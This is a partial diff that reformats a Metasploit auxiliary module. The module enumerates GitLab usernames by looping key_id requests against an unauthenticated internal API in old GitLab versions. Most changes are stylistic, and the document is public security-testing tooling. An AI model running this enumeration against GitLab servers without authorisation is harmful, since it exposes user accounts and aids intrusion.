@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'json'
 
 class MetasploitModule < Msf::Auxiliary
@@ -12,31 +11,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'           => 'GitLab User Enumeration',
-      'Description'    => "
-        The GitLab 'internal' API is exposed unauthenticated on GitLab. This
-        allows the username for each SSH Key ID number to be retrieved. Users
-        who do not have an SSH Key cannot be enumerated in this fashion. LDAP
-        users, e.g. Active Directory users will also be returned. This issue
-        was fixed in GitLab v7.5.0 and is present from GitLab v5.0.0.
-      ",
-      'Author'         => 'Ben Campbell',
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2014-11-21',
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'GitLab User Enumeration',
+        'Description' => %q{
+          The GitLab 'internal' API is exposed unauthenticated on GitLab. This
+          allows the username for each SSH Key ID number to be retrieved. Users
+          who do not have an SSH Key cannot be enumerated in this fashion. LDAP
+          users, e.g. Active Directory users will also be returned. This issue
+          was fixed in GitLab v7.5.0 and is present from GitLab v5.0.0.
+        },
+        'Author' => 'Ben Campbell',
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2014-11-21',
+        'References' => [
           ['URL', 'https://labs.f-secure.com/archive/gitlab-user-enumeration/']
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [ true, 'Path to GitLab instance', '/']),
         OptInt.new('START_ID', [true, 'ID number to start from', 0]),
         OptInt.new('END_ID', [true, 'ID number to enumerate up to', 50])
-      ])
+      ]
+    )
   end
 
   def run_host(_ip)
@@ -45,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status('Sending GitLab version request...')
     res = send_request_cgi(
-        'uri' => check
+      'uri' => check
     )
 
     if res && res.code == 200 && res.body
@@ -84,10 +90,10 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Enumerating user keys #{datastore['START_ID']}-#{datastore['END_ID']}...")
     datastore['START_ID'].upto(datastore['END_ID']) do |id|
       res = send_request_cgi(
-          'uri'       => discover,
-          'method'    => 'GET',
-          'vars_get'  => { 'key_id' => id }
-        )
+        'uri' => discover,
+        'method' => 'GET',
+        'vars_get' => { 'key_id' => id }
+      )
 
       if res && res.code == 200 && res.body
         begin
